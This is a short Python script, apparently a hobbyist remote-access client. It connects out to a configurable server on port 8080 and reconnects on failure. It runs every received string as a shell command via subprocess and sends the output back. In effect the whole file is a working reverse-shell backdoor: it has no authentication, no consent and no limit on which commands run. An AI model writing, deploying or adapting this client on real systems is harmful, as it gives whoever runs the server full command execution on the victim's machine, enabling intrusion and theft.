import os
import socket
import subprocess
import time
### REMOTE MANGEMENT CLIENT 

# CREATES SOCKETS
def socket_create():
        try:
            global host
            global port
            global s
            host = ''    ### CHANGE THIS TO THE IP OF THE SERVER ### - Make sure ports are opened on the PC hosting the server file.
            port = 8080   
            s = socket.socket()
        except socket.error as msg:
                print("Socket creation error: " +str(msg))
# CONNECTS SOCKET TO HOST
def socket_connect():
        try:
            global host
            global port 
            global s
            s.connect((host,port))
        except socket.error as msg:
                print("Socket connection error: " +str(msg))
                time.sleep(5)
                socket_connect()
# RECEIVES COMMANDS FROM SERVER AND EXECUTES THEM WITH SUBPROCESS MODULE AND SEND RESPONSE TO SERVER      
def recieve_commands():
        while True:
             data = s.recv(20480)
             if data[:2].decode("utf-8") =='cd':
                try:
                    os.chdir(data[3:].decode("utf-8"))
                except:
                    pass
             if len(data) > 0:  
                try:                                                                                                                                   
                    cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) #Connects to input/out pipes gives return codes. 
                    output_bytes = cmd.stdout.read() + cmd.stderr.read()
                    output_str = str(output_bytes, "utf-8")
                    s.send(str.encode(output_str + str(os.getcwd()) + '> '))
                    print(output_str)
                except:
                    output_str = "Command not recognized" + "\n"
                    s.send(str.encode(output_str + str(os.getcwd()) + "> "))
                    print(output_str)
        s.close()
# MAIN - CREATES SOCKET, CONNECTS TO HOST, AND AWAITS COMMANDS
def main():
        global s
        try:
            socket_create()
            socket_connect()
            recieve_commands()
        except:
            print("Main error")
            time.sleep(5)
            s.close()
            main()
main()